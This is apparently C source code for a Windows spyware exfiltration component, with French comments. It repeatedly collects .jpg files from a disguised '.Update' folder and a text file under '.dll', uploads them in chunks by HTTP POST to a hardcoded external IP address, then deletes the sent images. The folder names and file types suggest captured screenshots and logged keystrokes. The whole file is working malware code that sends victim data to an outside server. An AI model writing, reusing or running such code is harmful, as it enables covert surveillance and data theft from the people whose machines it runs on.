#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define SERVER      "144.172.84.133"
#define PORT        8080
#define MAX_CHUNK   (1024 * 1024)  // 1 MB
#define WAIT_TIME   10             // seconds between cycles

#pragma comment(lib, "wininet.lib")

// Envoie un fichier découpé en segments selon le protocole HTTP
int send_file_in_chunks(const char* file_path, const char* file_type) {
    FILE* fp = fopen(file_path, "rb");
    if (!fp) return 0;

    fseek(fp, 0, SEEK_END);
    long size = ftell(fp);
    rewind(fp);

    unsigned char* buffer = (unsigned char*)malloc(size);
    if (!buffer) { fclose(fp); return 0; }

    fread(buffer, 1, size, fp);
    fclose(fp);

    int total_chunks = (int)((size + MAX_CHUNK - 1) / MAX_CHUNK);
    const char* filename = strrchr(file_path, '\\');
    if (filename) filename++;
    else filename = file_path;

    HINTERNET hInternet = InternetOpenA("Uploader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) { free(buffer); return 0; }

    HINTERNET hConnect = InternetConnectA(hInternet, SERVER, PORT, NULL, NULL,
                                          INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        free(buffer);
        return 0;
    }

    for (int i = 0; i < total_chunks; i++) {
        DWORD chunk_size = ((i + 1) * MAX_CHUNK < size) ? MAX_CHUNK : size - i * MAX_CHUNK;

        char headers[512];
        int hdr_len = snprintf(headers, sizeof(headers),
            "X-Filename: %s\r\n"
            "X-File-Type: %s\r\n"
            "X-Segment-Number: %d\r\n"
            "X-Total-Segments: %d\r\n",
            filename, file_type, i, total_chunks);
        if (hdr_len < 0) hdr_len = 0;

        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/", NULL,
                                             NULL, NULL,
                                             INTERNET_FLAG_RELOAD |
                                             INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (!hRequest) break;

        HttpSendRequestA(hRequest, headers, hdr_len,
                         buffer + (i * MAX_CHUNK), chunk_size);
        InternetCloseHandle(hRequest);

        Sleep(50);  // Petite pause
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    free(buffer);
    return 1;
}

// Récupère la liste des fichiers .jpg dans le dossier .Update
void get_jpg_files(const char* folder_path, char*** out_files, int* count) {
    char search_path[MAX_PATH];
    snprintf(search_path, sizeof(search_path), "%s\\*.jpg", folder_path);

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(search_path, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        *count = 0;
        *out_files = NULL;
        return;
    }

    char** list = NULL;
    int idx = 0;
    do {
        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            char full_path[MAX_PATH];
            snprintf(full_path, sizeof(full_path), "%s\\%s", folder_path, findData.cFileName);
            char* copy = _strdup(full_path);
            list = (char**)realloc(list, sizeof(char*) * (idx + 1));
            list[idx++] = copy;
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);
    *count = idx;
    *out_files = list;
}

// Thread principal : envoie chaque jpg puis le fichier texte associé
DWORD WINAPI process_files(LPVOID arg) {
    const char* folder_path = ".Update";
    const char* txt_path     = ".dll\\text.txt";

    while (1) {
        char** jpg_files = NULL;
        int jpg_count = 0;

        get_jpg_files(folder_path, &jpg_files, &jpg_count);
        if (jpg_count == 0) {
            printf("Aucun .jpg dans %s. Attente...\n", folder_path);
            Sleep(WAIT_TIME * 1000);
            continue;
        }

        for (int i = 0; i < jpg_count; i++) {
            if (send_file_in_chunks(jpg_files[i], ".Update")) {
                remove(jpg_files[i]);
            }
            free(jpg_files[i]);

            // Après chaque envoi de jpg, envoie le .txt
            send_file_in_chunks(txt_path, ".dll");
        }

        free(jpg_files);
        Sleep(WAIT_TIME * 1000);
    }
    return 0;
}

